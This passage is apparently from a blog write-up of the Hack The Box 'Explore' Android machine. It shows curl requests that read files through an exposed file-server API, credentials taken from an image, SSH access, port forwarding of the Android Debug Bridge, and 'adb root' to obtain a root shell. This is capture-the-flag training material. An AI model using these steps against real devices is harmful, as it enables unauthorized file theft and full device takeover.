+</span></span><span style="display:flex;"><span>name:Music type:folder
+</span></span><span style="display:flex;"><span>name:backups type:folder
+</span></span><span style="display:flex;"><span>name:Ringtones type:folder
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>…
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl --header <span style="color:#a5d6ff">&#34;Content-Type: application/json&#34;</span> -s --request POST --data <span style="color:#a5d6ff">&#34;{\&#34;command\&#34;:\&#34;getFile\&#34;}&#34;</span> http://10.10.10.247:59777/sdcard/user.txt
+</span></span><span style="display:flex;"><span>f32017174c…
+</span></span></code></pre></div><p>Further focusing my efforts on the <code>/sdcard</code> directory, I enumerated its subdirectories:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore/enum<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat sdcard-folders | awk -F<span style="color:#a5d6ff">&#39; &#39;</span> <span style="color:#a5d6ff">&#39;{print $1}&#39;</span> | awk -F <span style="color:#a5d6ff">&#39;:&#39;</span> <span style="color:#a5d6ff">&#39;{print $2}&#39;</span> | <span style="color:#ff7b72">while</span> read p; <span style="color:#ff7b72">do</span>  echo <span style="color:#a5d6ff">&#34;\n\n</span><span style="color:#79c0ff">$p</span><span style="color:#a5d6ff">\n--&#34;</span>; curl --header <span style="color:#a5d6ff">&#34;Content-Type: application/json&#34;</span> -s --request POST --data <span style="color:#a5d6ff">&#34;{\&#34;comman
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">d\&#34;:\&#34;listFiles\&#34;}&#34;</span> http://10.10.10.247:59777/sdcard/<span style="color:#79c0ff">$p</span>/ | awk -F<span style="color:#a5d6ff">&#39;, &#39;</span> <span style="color:#a5d6ff">&#39;{print $1, $3}&#39;</span> | tr -d <span style="color:#a5d6ff">&#39;{&#39;</span> | tr -d <span style="color:#a5d6ff">&#39;&#34;&#39;</span>; <span style="color:#ff7b72">done</span> | tee sdcard-nested-ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Android
+</span></span><span style="display:flex;"><span>--
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name:data type:folder
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>…
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DCIM
+</span></span><span style="display:flex;"><span>--
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>name:concept.jpg type:file
+</span></span><span style="display:flex;"><span>name:anc.png type:file
+</span></span><span style="display:flex;"><span>name:creds.jpg type:file
+</span></span><span style="display:flex;"><span>name:224_anc.png type:file
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>…
+</span></span></code></pre></div><p>Within the <code>/sdcard/DCIM</code> directory there&rsquo;s a file called <code>creds.jpg</code>, which I promptly downloaded.</p>
+<p><img src="creds.jpg" alt=""></p>
+<p>Using those credentials, I was able to ssh onto the device as the <code>kristi</code> user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh -p <span style="color:#a5d6ff">2222</span> kristi@10.10.10.247
+</span></span><span style="display:flex;"><span>Password authentication
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>:/ $ id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>10076<span style="color:#ff7b72;font-weight:bold">(</span>u0_a76<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>10076<span style="color:#ff7b72;font-weight:bold">(</span>u0_a76<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>10076<span style="color:#ff7b72;font-weight:bold">(</span>u0_a76<span style="color:#ff7b72;font-weight:bold">)</span>,3003<span style="color:#ff7b72;font-weight:bold">(</span>inet<span style="color:#ff7b72;font-weight:bold">)</span>,9997<span style="color:#ff7b72;font-weight:bold">(</span>everybody<span style="color:#ff7b72;font-weight:bold">)</span>,20076<span style="color:#ff7b72;font-weight:bold">(</span>u0_a76_cache<span style="color:#ff7b72;font-weight:bold">)</span>,50076<span style="color:#ff7b72;font-weight:bold">(</span>all_a76<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">context</span><span style="color:#ff7b72;font-weight:bold">=</span>u:r:untrusted_app:s0:c76,c256,c512,c768
+</span></span></code></pre></div><h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Once on the box as the <code>kristi</code> user, I was in somewhat of unusual territory. Android devices feel familiar given their Linux underpinnings, however, the differences in filesystem design and the platitude of unfamiliar services will definitely act to increase the level of noise and confusion to those familiar with Linux but unfamiliar with Android. The best way to go about approaching it, in my humble opinion, is not to think of all of the differences between the machines, but rather to focus on the similarities and the common techniques utilized on Linux systems to escalate privileges. With that said, I performed basic manual enumeration of the machine using common tools and was reintroduced to the previously filtered port <code>5555</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>:/ $ netstat -an
+</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#ff7b72;font-weight:bold">(</span>established and servers<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> :::59777                :::*                    LISTEN
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:10.10.10.2:43457 :::*                    LISTEN
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:127.0.0.1:33705  :::*                    LISTEN
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> :::2222                 :::*                    LISTEN
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> :::5555                 :::*                    LISTEN
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> :::42135                :::*                    LISTEN
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:127.0.0.1:60534  ::ffff:127.0.0.1:5555   ESTABLISHED
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:127.0.0.1:60532  ::ffff:127.0.0.1:5555   ESTABLISHED
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:127.0.0.1:60538  ::ffff:127.0.0.1:5555   ESTABLISHED
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:60534  ESTABLISHED
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:127.0.0.1:60536  ::ffff:127.0.0.1:5555   ESTABLISHED
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:60536  ESTABLISHED
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:60538  ESTABLISHED
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:60532  ESTABLISHED
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>    <span style="color:#a5d6ff">656</span> ::ffff:10.10.10.24:2222 ::ffff:10.10.14.1:34112 ESTABLISHED
+</span></span><span style="display:flex;"><span>udp        <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> 10.10.10.247:14873      1.1.1.1:53              ESTABLISHED
+</span></span><span style="display:flex;"><span>udp        <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> 10.10.10.247:20128      1.0.0.1:53              ESTABLISHED
+</span></span><span style="display:flex;"><span>udp        <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> 0.0.0.0:52088           0.0.0.0:*
+</span></span><span style="display:flex;"><span>udp        <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> 0.0.0.0:5353            0.0.0.0:*
+</span></span><span style="display:flex;"><span>udp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> :::55597                :::*
+</span></span><span style="display:flex;"><span>udp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> :::1900                 :::*
+</span></span><span style="display:flex;"><span>udp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::ffff:10.10.10.2:53365 :::*
+</span></span><span style="display:flex;"><span>udp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> :::5353                 :::*
+</span></span><span style="display:flex;"><span>udp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> :::5353                 :::*
+</span></span><span style="display:flex;"><span>udp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> :::5353                 :::*
+</span></span><span style="display:flex;"><span>…
+</span></span></code></pre></div><p>Once on the box, enumeration of this port becomes much simpler and it becomes clear through open-source research that this service is likely the Android Debug Bridge (adb). This service is part of the Android software development kit (SDK) and is used primarily by developers to test and debug their projects. The functionalities of the service itself exist to facilitate communication with the device, however, there are some features that, as far as attackers would be concerned, are highly attractive and ripe for exploitation. To exploit this from my host machine, I forwarded the port to my kali box via ssh:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh kristi@10.10.10.247 -L 5555:127.0.0.1:5555 -p <span style="color:#a5d6ff">2222</span>
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">255</span> ⨯
+</span></span><span style="display:flex;"><span>Password authentication
+</span></span><span style="display:flex;"><span>Password:
+</span></span><span style="display:flex;"><span>:/ $
+</span></span><span style="display:flex;"><span>:/ $
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ netstat -ano | grep <span style="color:#a5d6ff">5555</span>
+</span></span><span style="display:flex;"><span>tcp        <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> 127.0.0.1:5555          0.0.0.0:*               LISTEN      off <span style="color:#ff7b72;font-weight:bold">(</span>0.00/0/0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>tcp6       <span style="color:#a5d6ff">0</span>      <span style="color:#a5d6ff">0</span> ::1:5555                :::*                    LISTEN      off <span style="color:#ff7b72;font-weight:bold">(</span>0.00/0/0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span></code></pre></div><p>With the port now listening on my local machine, I installed <code>adb</code> and began to search for a path to <code>root</code> using it. On the <a href="https://developer.android.com/studio/command-line/adb"  class="external-link" target="_blank" rel="noopener">official Android documentation</a>, they thoroughly describe much of the functionality and the many powerful features associated with the tool. However, there&rsquo;s no clear privilege escalation vector using just what is described there. However, what is not as well documented (on the Android Developer site, anyhow) is that there is built-in functionality for restarting the <code>adb</code> daemon as <code>root</code>, which would allow any user with access to the debugger to spawn a <code>root</code> shell. Worth noting that this will only work if root access for adb is enabled in the developer settings. With that in place, going from <code>kristi</code> to <code>root</code> requires only a few simple commands. First, I ran the officially documented commands to demonstrate that those alone would not allow one to get a <code>root</code> shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ adb connect 127.0.0.1:5555
+</span></span><span style="display:flex;"><span>connected to 127.0.0.1:5555
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ adb shell
+</span></span><span style="display:flex;"><span>x86_64:/ $ id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>2000<span style="color:#ff7b72;font-weight:bold">(</span>shell<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>2000<span style="color:#ff7b72;font-weight:bold">(</span>shell<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>2000<span style="color:#ff7b72;font-weight:bold">(</span>shell<span style="color:#ff7b72;font-weight:bold">)</span>,1004<span style="color:#ff7b72;font-weight:bold">(</span>input<span style="color:#ff7b72;font-weight:bold">)</span>,1007<span style="color:#ff7b72;font-weight:bold">(</span>log<span style="color:#ff7b72;font-weight:bold">)</span>,1011<span style="color:#ff7b72;font-weight:bold">(</span>adb<span style="color:#ff7b72;font-weight:bold">)</span>,1015<span style="color:#ff7b72;font-weight:bold">(</span>sdcard_rw<span style="color:#ff7b72;font-weight:bold">)</span>,1028<span style="color:#ff7b72;font-weight:bold">(</span>sdcard_r<span style="color:#ff7b72;font-weight:bold">)</span>,3001<span style="color:#ff7b72;font-weight:bold">(</span>net_bt_admin<span style="color:#ff7b72;font-weight:bold">)</span>,3002<span style="color:#ff7b72;font-weight:bold">(</span>net_bt<span style="color:#ff7b72;font-weight:bold">)</span>,3003<span style="color:#ff7b72;font-weight:bold">(</span>inet<span style="color:#ff7b72;font-weight:bold">)</span>,3006<span style="color:#ff7b72;font-weight:bold">(</span>net_bw_stats<span style="color:#ff7b72;font-weight:bold">)</span>,3009<span style="color:#ff7b72;font-weight:bold">(</span>readproc<span style="color:#ff7b72;font-weight:bold">)</span>,3011<span style="color:#ff7b72;font-weight:bold">(</span>uhid<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">context</span><span style="color:#ff7b72;font-weight:bold">=</span>u:r:shell:s0
+</span></span><span style="display:flex;"><span>x86_64:/ $ exit
+</span></span></code></pre></div><p>After that, I restarted the daemon as <code>root</code> and ran the same commands again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ adb root
+</span></span><span style="display:flex;"><span>restarting adbd as root
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/explore<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ adb shell
+</span></span><span style="display:flex;"><span>x86_64:/ <span style="color:#8b949e;font-style:italic"># id</span>
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span>,1004<span style="color:#ff7b72;font-weight:bold">(</span>input<span style="color:#ff7b72;font-weight:bold">)</span>,1007<span style="color:#ff7b72;font-weight:bold">(</span>log<span style="color:#ff7b72;font-weight:bold">)</span>,1011<span style="color:#ff7b72;font-weight:bold">(</span>adb<span style="color:#ff7b72;font-weight:bold">)</span>,1015<span style="color:#ff7b72;font-weight:bold">(</span>sdcard_rw<span style="color:#ff7b72;font-weight:bold">)</span>,1028<span style="color:#ff7b72;font-weight:bold">(</span>sdcard_r<span style="color:#ff7b72;font-weight:bold">)</span>,3001<span style="color:#ff7b72;font-weight:bold">(</span>net_bt_admin<span style="color:#ff7b72;font-weight:bold">)</span>,3002<span style="color:#ff7b72;font-weight:bold">(</span>net_bt<span style="color:#ff7b72;font-weight:bold">)</span>,3003<span style="color:#ff7b72;font-weight:bold">(</span>inet<span style="color:#ff7b72;font-weight:bold">)</span>,3006<span style="color:#ff7b72;font-weight:bold">(</span>net_bw_stats<span style="color:#ff7b72;font-weight:bold">)</span>,3009<span style="color:#ff7b72;font-weight:bold">(</span>readproc<span style="color:#ff7b72;font-weight:bold">)</span>,3011<span style="color:#ff7b72;font-weight:bold">(</span>uhid<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">context</span><span style="color:#ff7b72;font-weight:bold">=</span>u:r:su:s0
+</span></span><span style="display:flex;"><span>x86_64:/sdcard/Android/data <span style="color:#8b949e;font-style:italic"># find / -name root.txt 2&gt; /dev/null</span>
+</span></span><span style="display:flex;"><span>/data/root.txt
+</span></span><span style="display:flex;"><span>1|x86_64:/sdcard/Android/data <span style="color:#8b949e;font-style:italic"># </span>
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2020 -
+    
+    2025
+     matt johnson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
